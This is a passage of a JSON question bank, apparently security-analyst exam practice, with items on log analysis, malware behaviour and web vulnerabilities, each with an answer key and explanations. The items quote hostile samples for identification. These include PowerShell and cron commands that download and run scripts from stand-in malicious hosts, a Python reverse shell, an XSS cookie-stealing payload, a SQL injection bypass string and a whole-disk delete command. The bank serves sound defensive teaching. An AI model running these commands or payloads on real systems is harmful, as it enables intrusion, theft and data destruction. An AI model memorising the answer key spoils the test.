      "explanation": "The behavior of creating admin users, disabling security tools, and establishing external connections is typical of trojans designed for long-term access.",
      "examTip": "Trojans often mimic legitimate processes while establishing persistent backdoors for attackers."
    },
    {
      "id": 51,
      "question": "You review the following log from a web application firewall (WAF):\n\n[INFO] POST /login HTTP/1.1 200 OK\nPayload: username=admin' OR '1'='1&password=pass123\n\nWhich attack is being attempted?",
      "options": [
        "SQL Injection",
        "Cross-site scripting (XSS)",
        "Command injection",
        "XML External Entity (XXE) attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The payload includes `' OR '1'='1`, a typical SQL injection technique to bypass authentication.",
      "examTip": "Watch for SQL logic manipulation in login forms to detect injection attempts."
    },
    {
      "id": 52,
      "question": "A malware sample is analyzed and found to:\n- Use DNS queries to exfiltrate data\n- Communicate with an attacker-controlled domain\n- Utilize encoded data in DNS TXT records\n\nWhich technique does this malware use?",
      "options": [
        "DNS tunneling",
        "Domain generation algorithm (DGA)",
        "Command-and-control beaconing",
        "Data obfuscation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DNS tunneling uses DNS protocols (like TXT records) to covertly transfer data, often bypassing standard security controls.",
      "examTip": "Monitor DNS traffic for unusual TXT records and frequent requests to suspicious domains."
    },
    {
      "id": 53,
      "question": "A penetration test report reveals that an internal application trusts serialized objects from user input without validation.\n\nWhich vulnerability does this represent?",
      "options": [
        "Insecure deserialization",
        "Cross-site request forgery (CSRF)",
        "Broken authentication",
        "Privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Insecure deserialization can allow attackers to execute arbitrary code by manipulating serialized objects.",
      "examTip": "Use secure serialization methods and validate all user input during deserialization."
    },
    {
      "id": 54,
      "question": "A security analyst detects a sudden increase in successful login attempts from various IP addresses, all using valid credentials, followed by suspicious outbound traffic.\n\nWhich attack technique is most likely being used?",
      "options": [
        "Credential stuffing",
        "Brute force attack",
        "Pass-the-hash attack",
        "Lateral movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential stuffing uses previously compromised credentials across multiple accounts and services.",
      "examTip": "Monitor login patterns and implement MFA to mitigate credential stuffing risks."
    },
    {
      "id": 55,
      "question": "Review the following log:\n\nFeb 23 16:35:17 server1 sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\nWhat does this log entry indicate?",
      "options": [
        "Privilege escalation attempt via spawning a shell",
        "Data exfiltration using Python scripts",
        "Persistence establishment through cron jobs",
        "Command injection in a web application"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Python command spawns a bash shell with root privileges, indicating a potential privilege escalation attempt.",
      "examTip": "Investigate shell spawning commands, especially when executed via sudo, for privilege abuse attempts."
    },
    {
      "id": 56,
      "question": "A security engineer notices multiple internal endpoints attempting to reach 203.0.113.45 over TCP port 22. The organization does not use SSH for internal communication.\n\nWhich action should be taken FIRST?",
      "options": [
        "Isolate the affected systems from the network",
        "Conduct packet captures to analyze SSH traffic",
        "Update firewall rules to block port 22",
        "Notify stakeholders of a potential breach"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unexpected SSH communication suggests lateral movement or malware activity; isolating affected systems prevents further compromise.",
      "examTip": "Containment through isolation should always precede deeper analysis during active incidents."
    },
    {
      "id": 57,
      "question": "A review of cloud configurations shows that an administrator role in the AWS environment lacks MFA and uses an API key stored in a public GitHub repository.\n\nWhich risk does this pose?",
      "options": [
        "Credential exposure leading to full account compromise",
        "Privilege escalation through IAM role chaining",
        "Session hijacking using temporary access tokens",
        "Resource exhaustion via crypto mining attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Storing API keys publicly allows attackers to access cloud resources with admin privileges, potentially leading to total account compromise.",
      "examTip": "Never store cloud access keys in public repositories; use environment variables and enable MFA."
    },
    {
      "id": 58,
      "question": "Analyze the following code snippet:\n\nimport os\nos.system(\"rm -rf / --no-preserve-root\")\n\nWhat is the primary risk associated with this code?",
      "options": [
        "Destructive command leading to total system deletion",
        "Privilege escalation using system-level commands",
        "Data exfiltration through file system traversal",
        "Command injection vulnerability"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command forcefully deletes all files on the system without preservation, representing a Denial of Service (DoS) scenario.",
      "examTip": "Audit code for destructive commands, especially those affecting critical directories."
    },
    {
      "id": 59,
      "question": "A suspicious email passes SPF and DKIM checks but contains a link to an unfamiliar domain. The email urges urgent action related to a financial transaction.\n\nWhich additional control could detect if this email is malicious?",
      "options": [
        "DMARC analysis for domain alignment",
        "SPF record revalidation against sending servers",
        "Firewall rules to block phishing URLs",
        "User behavior analytics (UBA) on email interactions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "While SPF and DKIM passed, DMARC enforces domain alignment, which helps detect phishing attempts that spoof legitimate domains.",
      "examTip": "DMARC policies add an extra layer of protection by verifying sender legitimacy beyond SPF/DKIM."
    },
    {
      "id": 60,
      "question": "An attacker exploits a web application by injecting malicious XML payloads that access internal files.\n\nWhich type of attack is being performed?",
      "options": [
        "XML External Entity (XXE) attack",
        "Server-side request forgery (SSRF)",
        "Cross-site scripting (XSS)",
        "Remote code execution (RCE)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "XXE attacks exploit XML parsers by referencing external entities to read internal files or execute commands.",
      "examTip": "Disable DTD processing and use secure XML parsers to prevent XXE vulnerabilities."
    },
    {
      "id": 61,
      "question": "A security analyst observes unusual outbound HTTPS connections from a server to multiple IP addresses on port 443 at regular intervals. The traffic uses self-signed certificates not recognized by internal systems.\n\nWhat does this activity most likely indicate?",
      "options": [
        "Command-and-control (C2) communication using encrypted channels",
        "Legitimate system updates from vendor-managed servers",
        "Man-in-the-middle (MITM) attack intercepting HTTPS traffic",
        "Data exfiltration via DNS tunneling"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Regular outbound HTTPS traffic using unrecognized self-signed certificates suggests encrypted C2 communication to avoid detection.",
      "examTip": "Monitor TLS traffic for unusual certificate authorities and unexpected external destinations."
    },
    {
      "id": 62,
      "question": "A review of web server access logs shows the following entries:\n\n192.168.1.10 - - [23/Feb/2025:13:32:45 +0000] \"GET /api/user?role=admin HTTP/1.1\" 200 1024\n192.168.1.10 - - [23/Feb/2025:13:32:50 +0000] \"GET /api/user?role=superadmin HTTP/1.1\" 200 1056\n\nWhat vulnerability is most likely being exploited?",
      "options": [
        "Insecure Direct Object Reference (IDOR)",
        "Broken access control",
        "Cross-site scripting (XSS)",
        "SQL injection"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Manipulating user role parameters without proper authorization checks is a clear sign of broken access control.",
      "examTip": "APIs must enforce proper access controls at every level to prevent privilege manipulation."
    },
    {
      "id": 63,
      "question": "A cloud storage bucket is discovered with sensitive customer data accessible via public URLs. The security policy states that only internal users should have access.\n\nWhich control would BEST prevent this exposure?",
      "options": [
        "Implement identity-based access policies on the bucket",
        "Apply server-side encryption using customer-managed keys",
        "Configure VPC endpoints for private access to storage",
        "Enable detailed audit logging for all bucket operations"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Applying identity-based access policies ensures that only authenticated, authorized users can access sensitive cloud storage resources.",
      "examTip": "Public access to sensitive data in cloud environments should be disabled by default with strict identity controls."
    },
    {
      "id": 64,
      "question": "You detect the following PowerShell command in system logs:\n\npowershell.exe -nop -w hidden -c \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/revshell.ps1')\"\n\nWhat should be the immediate next step?",
      "options": [
        "Isolate the affected host from the network",
        "Run antivirus scans to detect malware signatures",
        "Analyze firewall logs for outbound C2 connections",
        "Check user permissions for unauthorized privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads and executes a remote shell script in memory—immediate host isolation is critical to contain the threat.",
      "examTip": "For fileless malware, containment through isolation is the top priority before further analysis."
    },
    {
      "id": 65,
      "question": "An attacker exploits an API by sending a request that bypasses client-side validation and modifies the 'userId' parameter to access another user’s data.\n\nWhich vulnerability does this represent?",
      "options": [
        "Insecure Direct Object Reference (IDOR)",
        "Broken authentication",
        "Cross-site request forgery (CSRF)",
        "Command injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "IDOR occurs when an attacker can manipulate object references (such as 'userId') to access unauthorized data due to lack of proper server-side validation.",
      "examTip": "Implement server-side validation for all object references to prevent IDOR vulnerabilities."
    },
    {
      "id": 66,
      "question": "During a vulnerability assessment, a web server is found to be using outdated TLS 1.0 protocols. The organization handles payment transactions.\n\nWhich compliance standard would MOST LIKELY flag this as a critical issue?",
      "options": [
        "PCI DSS",
        "ISO 27001",
        "NIST 800-53",
        "OWASP Top Ten"
      ],
      "correctAnswerIndex": 0,
      "explanation": "PCI DSS requires strong encryption for payment data transmission; TLS 1.0 is considered insecure and non-compliant with PCI DSS standards.",
      "examTip": "For payment-related environments, ensure encryption protocols meet PCI DSS standards (TLS 1.2+)."
    },
    {
      "id": 67,
      "question": "An internal host is repeatedly resolving random domain names such as abcd1234.randomdomain.net and xyz5678.randomdomain.net without corresponding HTTP traffic.\n\nWhich behavior does this MOST LIKELY indicate?",
      "options": [
        "Domain Generation Algorithm (DGA) used for malware persistence",
        "DNS poisoning attempts targeting internal name servers",
        "Beaconing to a command-and-control (C2) server using DNS tunneling",
        "Reconnaissance scanning for open DNS resolvers"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The use of random domains without further connections suggests DGA behavior, where malware generates domains to locate active C2 servers.",
      "examTip": "Look for frequent DNS queries to seemingly random domains as indicators of DGA-based malware."
    },
    {
      "id": 68,
      "question": "A penetration tester successfully gains access to a Windows server and executes the following command:\n\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d \"C:\\\\malware.exe\"\n\nWhat is the primary purpose of this action?",
      "options": [
        "Establish persistence by executing malware on startup",
        "Escalate privileges through registry manipulation",
        "Disable endpoint protection software",
        "Exfiltrate data through registry key modifications"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Adding entries to the 'Run' registry key ensures that malware runs automatically upon system startup, establishing persistence.",
      "examTip": "Monitor critical registry paths for unauthorized modifications—common in persistence techniques."
    },
    {
      "id": 69,
      "question": "A sandbox analysis reveals that a malware sample:\n- Creates scheduled tasks with SYSTEM privileges\n- Establishes outbound connections on port 8080\n- Disables Windows Defender services\n\nWhich type of malware behavior is being observed?",
      "options": [
        "Trojan establishing persistence and C2 communication",
        "Rootkit hiding malicious processes from detection",
        "Ransomware preparing for file encryption",
        "Worm attempting to spread across the network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The combination of persistence mechanisms (scheduled tasks), outbound C2 communication, and security service disablement aligns with Trojan behavior.",
      "examTip": "Trojan indicators often include persistence techniques and efforts to disable defenses for prolonged access."
    },
    {
      "id": 70,
      "question": "A network security tool generates an alert for abnormal SMB traffic between internal hosts, followed by large file transfers to a single host.\n\nWhich attack phase is MOST LIKELY occurring?",
      "options": [
        "Lateral movement",
        "Initial access",
        "Exfiltration",
        "Reconnaissance"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Abnormal SMB traffic and internal file transfers are indicative of lateral movement, where attackers move between systems within the network.",
      "examTip": "Monitor internal SMB traffic patterns—unusual transfers may signal lateral movement attempts."
    },
    {
      "id": 71,
      "question": "A security analyst discovers that attackers are intercepting HTTP traffic and injecting malicious JavaScript into web pages served to users.\n\nWhich type of attack is being conducted?",
      "options": [
        "Man-in-the-middle (MITM) attack",
        "Cross-site scripting (XSS)",
        "Session hijacking",
        "DNS poisoning"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Intercepting and modifying HTTP traffic before it reaches the user is characteristic of a MITM attack.",
      "examTip": "Use HTTPS with valid certificates to prevent MITM attacks on web traffic."
    },
    {
      "id": 72,
      "question": "During a review of user behavior analytics, multiple failed login attempts from diverse geographic locations for a single user account are detected within a short period.\n\nWhich attack method is most likely being attempted?",
      "options": [
        "Credential stuffing",
        "Brute force attack",
        "Phishing",
        "Man-in-the-middle attack"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Multiple rapid login attempts typically indicate a brute force attack where attackers try many passwords to gain access.",
      "examTip": "Implement account lockout policies and MFA to reduce the risk of brute force attacks."
    },
    {
      "id": 73,
      "question": "A penetration tester discovers that a web application fails to validate user input and directly executes OS-level commands based on user-supplied data.\n\nWhich vulnerability is present?",
      "options": [
        "Command injection",
        "SQL injection",
        "Cross-site request forgery (CSRF)",
        "Insecure deserialization"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Command injection occurs when user input is directly passed to a system shell without proper validation, allowing arbitrary OS command execution.",
      "examTip": "Always sanitize and validate user inputs, especially when passing them to system commands."
    },
    {
      "id": 74,
      "question": "The following Python code is discovered on a compromised server:\n\nimport socket\ns = socket.socket()\ns.connect(('203.0.113.25', 5555))\nwhile True:\n    command = s.recv(1024)\n    if command:\n        output = os.popen(command.decode()).read()\n        s.send(output.encode())\n\nWhat malicious function does this code perform?",
      "options": [
        "Reverse shell for remote command execution",
        "Keylogger capturing user input",
        "Ransomware encrypting user files",
        "Botnet client participating in DDoS attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The code creates a reverse shell that connects to an attacker-controlled server and executes received commands remotely.",
      "examTip": "Detect reverse shells by monitoring unusual outbound connections and unexpected listening ports."
    },
    {
      "id": 75,
      "question": "An attacker exploits a web application using the following URL:\n\nhttp://example.com/view.php?file=../../../../etc/passwd\n\nWhich vulnerability is being exploited?",
      "options": [
        "Directory traversal",
        "Remote file inclusion (RFI)",
        "Cross-site scripting (XSS)",
        "SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `../` sequence in the URL attempts to access restricted files, indicating a directory traversal vulnerability.",
      "examTip": "Prevent directory traversal by sanitizing user input and restricting file path access."
    },
    {
      "id": 76,
      "question": "During incident response, you detect that malware was distributed via a legitimate website by injecting malicious JavaScript code that runs in users' browsers.\n\nWhat type of attack does this represent?",
      "options": [
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Command injection",
        "Man-in-the-middle (MITM)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "XSS allows attackers to inject malicious scripts into web pages viewed by other users, running in their browsers.",
      "examTip": "Use input validation, output encoding, and CSP headers to defend against XSS attacks."
    },
    {
      "id": 77,
      "question": "A SIEM system detects multiple DNS requests from a single host to domains such as a1b2c3d4.example.com, e5f6g7h8.example.com, without corresponding HTTP traffic.\n\nWhat should be the next step for the analyst?",
      "options": [
        "Investigate for Domain Generation Algorithm (DGA) malware",
        "Block the external domain at the firewall level",
        "Check for DNS poisoning attempts in the network",
        "Notify management of a potential phishing campaign"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The pattern suggests DGA-based malware, which uses algorithmically generated domains to communicate with C2 servers.",
      "examTip": "Monitor DNS logs for unusual query patterns and domains with randomized strings to detect DGA activity."
    },
    {
      "id": 78,
      "question": "A recent compromise involved an attacker escalating privileges by exploiting a vulnerable SUID binary on a Linux server.\n\nWhich action would BEST prevent such attacks in the future?",
      "options": [
        "Regularly audit SUID/SGID permissions on critical systems",
        "Implement file integrity monitoring (FIM) solutions",
        "Apply kernel patches and disable unused services",
        "Enforce mandatory access controls (MAC) using SELinux"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Auditing SUID binaries helps detect and remove unnecessary privileges that attackers could exploit for escalation.",
      "examTip": "Minimize SUID binaries and ensure proper permissions to reduce privilege escalation vectors."
    },
    {
      "id": 79,
      "question": "During a threat hunt, the following PowerShell command is detected:\n\npowershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-ip.com/shell.ps1')\"\n\nWhich MITRE ATT&CK tactic does this align with?",
      "options": [
        "Execution",
        "Persistence",
        "Credential Access",
        "Lateral Movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads and executes a malicious script, which aligns with the 'Execution' tactic in the MITRE ATT&CK framework.",
      "examTip": "Monitor PowerShell usage for suspicious parameters like '-ep bypass' and in-memory script execution patterns."
    },
    {
      "id": 80,
      "question": "An attacker gains access to a cloud environment and spins up large GPU-powered virtual machines in multiple regions. The activity is detected due to unusual billing charges.\n\nWhat is the attacker's most likely objective?",
      "options": [
        "Cryptocurrency mining",
        "Distributed Denial of Service (DDoS) attack",
        "Data exfiltration",
        "Phishing infrastructure deployment"
      ],
      "correctAnswerIndex": 0,
      "explanation": "High-performance GPU instances are often used by attackers for cryptocurrency mining due to their computational power.",
      "examTip": "Monitor cloud billing alerts and usage patterns for unexpected spikes, which could indicate unauthorized resource usage."
    },
    {
      "id": 81,
      "question": "A security analyst identifies multiple successful login attempts to the VPN from an external IP address during non-business hours, followed by data downloads from sensitive file shares.\n\nWhich attack type does this MOST LIKELY represent?",
      "options": [
        "Credential compromise with data exfiltration",
        "Lateral movement after initial access",
        "Privilege escalation on internal systems",
        "Brute force attack against VPN credentials"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The combination of external logins and sensitive data downloads suggests that valid credentials were compromised for exfiltration purposes.",
      "examTip": "Monitor for unusual login times and geographic anomalies in VPN usage."
    },
    {
      "id": 82,
      "question": "An attacker injects the following payload into a web form:\n\n<script>fetch('http://malicious.com/steal?cookie=' + document.cookie)</script>\n\nWhich security issue does this demonstrate?",
      "options": [
        "Cross-site scripting (XSS)",
        "Command injection",
        "Cross-site request forgery (CSRF)",
        "SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The script attempts to steal cookies from a user's browser, indicating a cross-site scripting (XSS) attack.",
      "examTip": "Use output encoding and CSP headers to prevent XSS vulnerabilities."
    },
    {
      "id": 83,
      "question": "A threat intelligence feed reports a new malware strain that uses port 53 for covert communication. Network logs reveal unusual DNS requests with large payloads from multiple hosts.\n\nWhat should be the FIRST investigative action?",
      "options": [
        "Analyze DNS logs for potential tunneling activity",
        "Block outbound port 53 traffic at the firewall",
        "Inspect endpoint processes for suspicious activity",
        "Deploy network-based antivirus scanning tools"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Large DNS payloads may indicate DNS tunneling for covert communication; analyzing DNS logs is the first step for confirmation.",
      "examTip": "DNS tunneling often uses large DNS TXT records—monitor these for unusual patterns."
    },
    {
      "id": 84,
      "question": "A developer commits code that includes the following line:\n\naws_access_key_id = \"AKIAIOSFODNN7EXAMPLE\"\n\nWhat security risk does this introduce?",
      "options": [
        "Exposure of cloud credentials leading to unauthorized access",
        "Weak encryption allowing brute force decryption",
        "Injection vulnerability in cloud infrastructure",
        "Misconfigured access policies enabling privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Exposing AWS access keys in code repositories can lead to unauthorized access, potentially resulting in full environment compromise.",
      "examTip": "Use environment variables and IAM roles instead of hardcoding credentials."
    },
    {
      "id": 85,
      "question": "The following cron job is discovered on a Linux server:\n\n* * * * * wget http://malicious.com/payload.sh -O- | bash\n\nWhat is the likely purpose of this cron job?",
      "options": [
        "Persistence mechanism for continuous malware execution",
        "Privilege escalation via script execution",
        "Data exfiltration using scheduled scripts",
        "Disabling endpoint protection at regular intervals"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The cron job downloads and executes a script every minute, ensuring persistent execution of malicious code.",
      "examTip": "Review and validate cron jobs regularly for unauthorized persistent tasks."
    },
    {
      "id": 86,
      "question": "A cloud security audit reveals that SSH ports are open to the internet for multiple virtual machines. The environment contains sensitive customer data.\n\nWhat should be the MOST immediate remediation?",
      "options": [
        "Restrict SSH access to specific IP addresses using security groups",
        "Enable multi-factor authentication (MFA) for SSH connections",
        "Configure VPN access for all cloud-based SSH sessions",
        "Deploy a bastion host to manage administrative access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Restricting SSH access to trusted IP addresses reduces the attack surface and prevents unauthorized internet-wide access.",
      "examTip": "Publicly exposed SSH ports are high-risk—always apply least-privilege network access rules."
    },
    {
      "id": 87,
      "question": "A suspicious PowerShell command is detected:\n\npowershell.exe -enc SQBtAG0AbwByAHQAIABzAG8AbQBlACAAYwBvAGQAZQ==\n\nWhat is the significance of the '-enc' flag in this context?",
      "options": [
        "It indicates that the command is encoded to obfuscate its true purpose",
        "It allows the command to run with elevated privileges",
        "It bypasses execution policy settings on the system",
        "It loads a malicious module into PowerShell memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The '-enc' flag indicates base64-encoded PowerShell commands, a common technique used to hide malicious actions.",
      "examTip": "Monitor for encoded PowerShell commands—they are often used in obfuscation and evasion techniques."
    },
    {
      "id": 88,
      "question": "A web application vulnerability allows an attacker to include a remote file for execution on the server using user-controlled input.\n\nWhich vulnerability does this represent?",
      "options": [
        "Remote File Inclusion (RFI)",
        "Local File Inclusion (LFI)",
        "Server-side request forgery (SSRF)",
        "Cross-site scripting (XSS)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "RFI vulnerabilities occur when user input allows remote files to be fetched and executed on the server, potentially leading to remote code execution.",
      "examTip": "Sanitize all user input related to file handling and enforce strict path whitelisting."
    },
    {
      "id": 89,
      "question": "You detect a pattern in logs showing the following sequence:\n- Multiple failed login attempts\n- Successful login from a new device\n- Creation of new privileged user accounts\n- Configuration changes in firewall rules\n\nWhich phase of the cyber kill chain does this activity represent?",
      "options": [
        "Actions on Objectives",
        "Installation",
        "Lateral Movement",
        "Command and Control"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The creation of privileged accounts and system configuration changes indicate the attacker is achieving their final goals ('Actions on Objectives').",
      "examTip": "Watch for administrative actions following suspicious logins—often part of the final attack phase."
    },
    {
      "id": 90,
      "question": "A threat hunter detects that an endpoint is beaconing to an external IP address over port 8080 every hour. The connection uses minimal data and does not establish a persistent session.\n\nWhat is this behavior MOST likely indicative of?",
      "options": [
        "Command-and-control (C2) beaconing",
        "Denial-of-service (DoS) attack preparation",
        "Credential harvesting activity",
        "Lateral movement within the network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Low-frequency outbound connections with minimal data transfer suggest C2 beaconing, where the malware checks for attacker instructions.",
      "examTip": "Monitor endpoints for periodic, low-data outbound connections—common indicators of C2 communication."
    },
    {
      "id": 91,
      "question": "A security analyst detects repeated outbound connections from an internal host to IP 203.0.113.10 on port 53. The DNS queries contain long, encoded strings.\n\nWhat technique is MOST likely being used by the attacker?",
      "options": [
        "DNS tunneling for data exfiltration",
        "Domain generation algorithm (DGA) for C2 communication",
        "DNS spoofing for redirection to malicious servers",
        "DNS amplification for DDoS attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Long encoded DNS queries suggest DNS tunneling, which attackers use to exfiltrate data while bypassing network controls.",
      "examTip": "Monitor for unusually large or frequent DNS queries—signs of potential tunneling."
    },
    {
      "id": 92,
      "question": "The following code snippet is discovered in a web application:\n\nsystem(\"ping \" + $_GET['host']);\n\nWhat vulnerability does this code introduce?",
      "options": [
        "Command injection",
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Insecure deserialization"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The use of user-controlled input in a system command (`$_GET['host']`) without sanitization exposes the application to command injection.",
      "examTip": "Always sanitize user input before passing it to system-level functions to prevent command injection."
    },
    {
      "id": 93,
      "question": "A penetration test reveals that session tokens are predictable and do not expire upon logout.\n\nWhich risk does this present to the application?",
      "options": [
        "Session hijacking",
        "Cross-site request forgery (CSRF)",
        "SQL injection",
        "Insecure direct object reference (IDOR)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Predictable, persistent session tokens make it easier for attackers to hijack user sessions and impersonate legitimate users.",
      "examTip": "Ensure session tokens are random, securely generated, and expire after logout."
    },
    {
      "id": 94,
      "question": "A user reports being redirected to a malicious site after clicking a link from a trusted website. The URL in the browser shows:\n\nhttps://trustedsite.com/redirect?url=http://malicious.com\n\nWhich vulnerability is MOST LIKELY being exploited?",
      "options": [
        "Open redirect",
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Remote file inclusion (RFI)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "An open redirect occurs when user-controlled input determines the destination URL without validation, potentially leading to phishing attacks.",
      "examTip": "Validate and whitelist redirect URLs to prevent open redirect vulnerabilities."
    },
    {
      "id": 95,
      "question": "An attacker attempts to bypass authentication by submitting the following in the username field:\n\n' OR '1'='1\n\nWhat type of attack is this?",
      "options": [
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Command injection",
        "Session fixation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The payload attempts to manipulate SQL queries by using a tautology (`'1'='1`), a common SQL injection technique for bypassing authentication.",
      "examTip": "Use parameterized queries to prevent SQL injection vulnerabilities."
    },
    {
      "id": 96,
      "question": "During threat hunting, you observe repeated HTTP requests from an internal host to an external IP on port 4444.\n\nWhat does this behavior MOST LIKELY indicate?",
      "options": [
        "Reverse shell communication",
        "Data exfiltration via HTTP tunneling",
        "Distributed denial-of-service (DDoS) attack",
        "Phishing infrastructure connection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 4444 is commonly used for reverse shell connections (e.g., by Metasploit), indicating the host may be under remote control.",
      "examTip": "Investigate outbound connections on uncommon ports like 4444—common in remote access scenarios."
    },
    {
      "id": 97,
      "question": "A malware sample analyzed in a sandbox:\n- Spawns multiple child processes\n- Disables endpoint protection services\n- Encrypts user directories\n\nWhich type of malware does this behavior represent?",
      "options": [
        "Ransomware",
        "Rootkit",
        "Trojan",
        "Worm"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Encryption of user directories combined with disabling security tools indicates ransomware, which encrypts files to demand payment.",
      "examTip": "Ransomware behavior includes rapid encryption processes and attempts to disable security mechanisms."
    },
    {
      "id": 98,
      "question": "A vulnerability scan detects the following issue:\n- CVSS Score: 9.8 (Critical)\n- Network exploitable\n- No authentication required\n- Remote code execution possible\n\nWhat should be the FIRST remediation step?",
      "options": [
        "Apply vendor patches immediately",
        "Segment vulnerable systems from the network",
        "Notify stakeholders of potential exposure",
        "Conduct penetration testing to validate exploitability"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A critical, remotely exploitable vulnerability with no authentication required must be patched immediately to prevent exploitation.",
      "examTip": "Prioritize patching for vulnerabilities with high CVSS scores and easy network exploitability."
    },
    {
      "id": 99,
      "question": "A web application allows users to upload files but does not validate file types. An attacker uploads a PHP file that provides remote shell access.\n\nWhich vulnerability is being exploited?",
      "options": [
        "Unrestricted file upload",
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Directory traversal"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unrestricted file uploads can lead to remote code execution if attackers upload executable files that the server executes.",
      "examTip": "Validate file extensions, MIME types, and restrict executable uploads to prevent file upload vulnerabilities."
    },
    {
      "id": 100,
      "question": "During a cloud security assessment, it is found that storage buckets containing sensitive data are publicly accessible.\n\nWhich action should be taken FIRST to mitigate this risk?",
      "options": [
        "Apply proper access control policies to restrict public access",
        "Encrypt all data at rest using provider-managed keys",
        "Set up logging to monitor access attempts to storage buckets",
        "Configure versioning to recover from accidental deletions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Restricting public access immediately prevents unauthorized users from accessing sensitive data.",
      "examTip": "Cloud storage should always have least-privilege access policies—deny public access unless explicitly required."
    }
  ]
});
